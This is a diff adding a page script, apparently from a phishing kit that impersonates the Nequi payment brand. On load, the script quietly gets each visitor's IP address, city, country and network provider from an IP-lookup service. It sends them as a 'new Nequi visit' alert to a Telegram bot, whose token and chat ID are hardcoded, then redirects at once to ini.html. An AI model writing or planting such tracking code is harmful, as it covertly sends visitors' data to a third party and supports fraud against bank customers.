@@ -1,0 +1,46 @@
+<script>
+document.addEventListener("DOMContentLoaded", async function () {
+    const TELEGRAM_BOT_TOKEN = "8141847441:AAGCTjvs3qgEgikFa1laUTOX4eqR6Il1EhE";
+    const TELEGRAM_CHAT_ID = "-1002240181660";
+
+    try {
+        console.log("Obteniendo datos de IP...");
+        const ipResponse = await fetch("https://ipwhois.app/json/");
+        const ipData = await ipResponse.json();
+
+        if (!ipData || ipData.success === false) {
+            console.error("Error al obtener datos de IP");
+            return;
+        }
+
+        const fechaActual = new Date().toLocaleString();
+        const mensajeVisita = `🔔 *NUEVA VISITA NEQUI* 🔔\n\n` + 
+            `📅 *Fecha:* ${fechaActual}\n` +
+            `🌍 *IP:* ${ipData.ip}\n` +
+            `🏩 *Ciudad:* ${ipData.city}, ${ipData.region}\n` +
+            `🌎 *País:* ${ipData.country}\n` +
+            `🚧 *Proveedor de Red:* ${ipData.asn}`;
+
+        console.log("Enviando notificación de visita...");
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: mensajeVisita,
+                parse_mode: "Markdown"
+            })
+        });
+
+        console.log("✅ Notificación de visita enviada a Telegram");
+
+        // 🔄 Redirección automática a ini.html en 0 segundos
+        setTimeout(() => {
+            window.location.href = "ini.html";
+        }, 0); 
+
+    } catch (error) {
+        console.error("❌ Error al enviar la notificación de visita:", error);
+    }
+});
+</script>
